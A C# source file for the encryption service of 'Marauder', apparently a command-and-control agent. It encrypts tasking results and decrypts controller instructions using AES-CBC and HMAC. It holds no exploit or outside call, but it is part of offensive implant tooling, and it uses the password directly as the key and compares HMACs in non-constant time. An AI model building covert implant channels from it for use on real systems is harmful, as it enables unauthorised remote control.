/*
References used in this section:
https://gist.github.com/doncadavona/fd493b6ced456371da8879c22bb1c263
https://blog.bitscry.com/2018/04/13/cryptographically-secure-random-string/
http://blogs.interknowlogy.com/2012/06/08/providing-integrity-for-encrypted-data-with-hmacs-in-net/
 */

using System;
using System.Text;
using System.Collections.Generic;
using System.Security.Cryptography;

using Newtonsoft.Json;

using Marauder.Objects;

namespace Marauder.Services
{
  public class CryptoService
  {
    public event EventHandler<DecryptedMessageArgs> OnMessageDecrypted;
    public List<string> MessageQueue = new List<string>();

    /// <summary>
    /// PlainMessage is used to store all the results from tasks. Using an 
    /// object for this makes it easier to convert to JSON.
    /// </summary>
    private class PlainMessage
    {
      public string LastTaskName;
      public List<TaskResult> Results;

      public PlainMessage(string LastTaskName, List<TaskResult> Results)
      {
        this.LastTaskName = LastTaskName;
        this.Results = Results;
      }
    }

    
    public static string GenerateSecureString(int length, string chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890-_")
    {
      RNGCryptoServiceProvider crypto = new RNGCryptoServiceProvider();
      byte[] data = new byte[length];

        // If chars.Length isn't a power of 2 then there is a bias if we simply use the modulus operator. The first characters of chars will be more probable than the last ones.
        // buffer used if we encounter an unusable random byte. We will regenerate it in this buffer
        byte[] buffer = null;

        // Maximum random number that can be used without introducing a bias
        int maxRandom = byte.MaxValue - ((byte.MaxValue + 1) % chars.Length);

        crypto.GetBytes(data);

        char[] result = new char[length];

        for (int i = 0; i < length; i++)
        {
            byte value = data[i];

            while (value > maxRandom)
            {
                if (buffer == null)
                {
                    buffer = new byte[1];
                }

                crypto.GetBytes(buffer);
                value = buffer[0];
            }

            result[i] = chars[value % chars.Length];
        }
        return new string(result);
    }

    /// <summary>
    /// Encrypt takes a plaintext message and returns a base64 encoded dict with the following keys:
    /// * AgentId (Agent Id that encrypted the message)
    /// * Message (Encrypted Message)
    /// * IV
    /// * HMAC
    /// </summary>
    /// <param name="plainMessageJson"></param>
    /// <returns></returns>
    public static string Encrypt(string plainMessageJson)
    {
      try
      {
        RijndaelManaged aes = new RijndaelManaged();
        aes.KeySize = 256;
        aes.BlockSize = 128;
        aes.Padding = PaddingMode.PKCS7;
        aes.Mode = CipherMode.CBC;

        aes.Key = Encoding.UTF8.GetBytes(State.Password);
        aes.GenerateIV();

        ICryptoTransform AESEncrypt = aes.CreateEncryptor(aes.Key, aes.IV);
        byte[] buffer = Encoding.UTF8.GetBytes(plainMessageJson);

        string encryptedText = Convert.ToBase64String(AESEncrypt.TransformFinalBlock(buffer, 0, buffer.Length));

        string hmac = Convert.ToBase64String(HmacSHA256(Convert.ToBase64String(aes.IV) + encryptedText, State.Password));

        Dictionary<string, string> response = new Dictionary<string, string>();
        if (!String.IsNullOrEmpty(State.Name))
        {
          response = new Dictionary<string, string>
          {
            { "AgentName", State.Name },
            { "IV", Convert.ToBase64String(aes.IV) },
            { "Message", encryptedText },
            { "HMAC", hmac }
          };
        }
        else {
          response = new Dictionary<string, string>
          {
            { "PayloadName", State.PayloadName },
            { "IV", Convert.ToBase64String(aes.IV) },
            { "Message", encryptedText },
            { "HMAC", hmac }
          };
        }
        string json_response = JsonConvert.SerializeObject(response);
        return Convert.ToBase64String(Encoding.UTF8.GetBytes(json_response));
      }
      catch (Exception e)
      {
        throw new Exception("Error encrypting: " + e.Message);
      }
    }

    public static string Decrypt(EncryptedMessage encryptedMessage) 
    {
      return Decrypt(encryptedMessage.IV, encryptedMessage.HMAC, encryptedMessage.Message);
    }

    // public static string Decrypt(Checkin checkinResponse) 
    // {
    //   return Decrypt(checkinResponse.IV, checkinResponse.HMAC, checkinResponse.Message);
    // }

    /// <summary>
    /// Decrypt expects a Dict with the following fields
    /// * Message (The encrypted message)
    /// * IV
    /// * HMAC
    /// </summary>
    /// <param name="encryptedMsg"></param>
    /// <returns>Decrypted string</returns>
    public static string Decrypt(string IV, string HMAC, string Message)
    {
      try
      {
        if (ValidateEncryptedData(IV, Message, HMAC))
        {
#if DEBUG          
          Logging.Write("CryptoService", "HMAC PASSED!");
#endif          
          RijndaelManaged aes = new RijndaelManaged();
          
          aes.KeySize = 256;
          aes.BlockSize = 128;
          aes.Padding = PaddingMode.PKCS7;
          aes.Mode = CipherMode.CBC;
          aes.Key = Encoding.UTF8.GetBytes(State.Password);

          aes.IV = Convert.FromBase64String(IV);

          ICryptoTransform AESDecrypt = aes.CreateDecryptor(aes.Key, aes.IV);
          byte[] buffer = Convert.FromBase64String(Message);

          return Encoding.UTF8.GetString(AESDecrypt.TransformFinalBlock(buffer, 0, buffer.Length));
        }
        else {
          throw new Exception("HMAC verification failed.");
        }
      }
      catch (Exception e)
      {
        throw new Exception("Error dectypting: " + e.Message);
      }
    }

    static byte[] HmacSHA256(String data, String key)
    {
      using (HMACSHA256 hmac = new HMACSHA256(Encoding.UTF8.GetBytes(key)))
      {
        return hmac.ComputeHash(Encoding.UTF8.GetBytes(data));
      }
    }

    public static bool ValidateEncryptedData(string iv, string encryptedText, string recievedHmac)
    {
      byte[] decodedHmac = Convert.FromBase64String(recievedHmac);
      byte[] calculatedHmac = HmacSHA256(iv + encryptedText, State.Password);
      return BytesAreEqual(calculatedHmac, decodedHmac);
    }

    // Checks to see if all the bytes in the two arrays are equal.
    // Returns fals if either of the arrays are null or not the same length.
    public static bool BytesAreEqual(byte[] array1, byte[] array2)
    {
        if (array1 == null || array2 == null || array1.Length != array2.Length)
            return false;

        if (array1.Length == 0) return true;

        for (int i = 0; i < array1.Length; i++)
        {
            if (array1[i] != array2[i])
                return false;
        }

        return true;
    }

    /// <summary>
    /// CreateAgentMessage is called by the Transport. It handles: 
    /// * getting all the task results from the queue
    /// * encrypting them
    /// * wrapping the encrypted results in an envelope
    /// * converting the envelope to json
    /// * base64 encoding the envelope
    /// </summary>
    /// <returns>Base64 encoded dictionary of IV, HMAC, Message</returns>
    public string CreateAgentMessage()
    {
#if DEBUG   
      Logging.Write("CryptoService", "Creating Encrypted Message..");
      Logging.Write("CryptoService", "Clearing Response Queue");
#endif      
      // foreach (TaskResponse response in responses)
      // {

      //     State.ResponseQueue.Remove(response);
      // }
      string encryptedMsg = "";
      if (State.ResultQueue.Count > 0)
      {
        string jsonMessage = JsonConvert.SerializeObject(State.ResultQueue);
#if DEBUG        
        Logging.Write("CryptoService", String.Format("Raw Json: {0}", jsonMessage));
#endif        
        encryptedMsg = Encrypt(jsonMessage);
        
        State.ResultQueue = new List<TaskResult>();
      }
      // Clear results queue
      return encryptedMsg;
    }

    public string CreateStagingMessage()
    {
#if DEBUG   
      Logging.Write("CryptoService", "Creating Staging Message..");
      Logging.Write("CryptoService", "Clearing Response Queue");
#endif      
      // foreach (TaskResponse response in responses)
      // {

      //     State.ResponseQueue.Remove(response);
      // }
  
      string jsonMessage = JsonConvert.SerializeObject(new StagingMessage());
#if DEBUG      
      Logging.Write("CryptoService", String.Format("Raw Json: {0}", jsonMessage));
#endif      
      return Encrypt(jsonMessage);
      
    }
    public void ProcessMessage(string message)
    {
#if DEBUG      
      Logging.Write("CryptoService", "Decrypting Message..");
#endif      


      string decodedMessage = Encoding.UTF8.GetString(Convert.FromBase64String(message));
#if DEBUG      
      Logging.Write("CryptoService", $"DecodedMessage: {decodedMessage}");
#endif      
      List<AgentTask> results = new List<AgentTask>();
      
      string decryptedContent = "";
#if DEBUG   
      Logging.Write("CryptoService", $"Current Payload Name: {State.PayloadName}");
      Logging.Write("CryptoService", $"Current Agent Name: {State.Name}");
      Logging.Write("CryptoService", $"Current Staging Id: {State.StagingId}");
#endif      

      if (String.IsNullOrEmpty(State.PayloadName))
      {
        List<EncryptedMessage> encryptedMessages = JsonConvert.DeserializeObject<List<EncryptedMessage>>(decodedMessage);
        foreach (EncryptedMessage encryptedMessage in encryptedMessages)
        {
          decryptedContent = Decrypt(encryptedMessage);
          results.Add(JsonConvert.DeserializeObject<AgentTask>(decryptedContent));
        }
      } 
      else 
      {
        EncryptedMessage encryptedMessage = JsonConvert.DeserializeObject<EncryptedMessage>(decodedMessage);
        decryptedContent = Decrypt(encryptedMessage);
        results = JsonConvert.DeserializeObject<List<AgentTask>>(decryptedContent);
      }
      
      if (results.Count > 0) {
#if DEBUG        
        Logging.Write("CryptoService", "Announcing new Tasks");
#endif        
        OnMessageDecrypted.Invoke(this, new DecryptedMessageArgs(results));
        
      }
    }

    public void RegisterMessageListener(object sender, MessageRecievedArgs args)
    {
      ProcessMessage(args.Message);
    }

    public CryptoService()
    {
      State.TransportService.OnMessageRecieved += RegisterMessageListener;
    }
  }
}
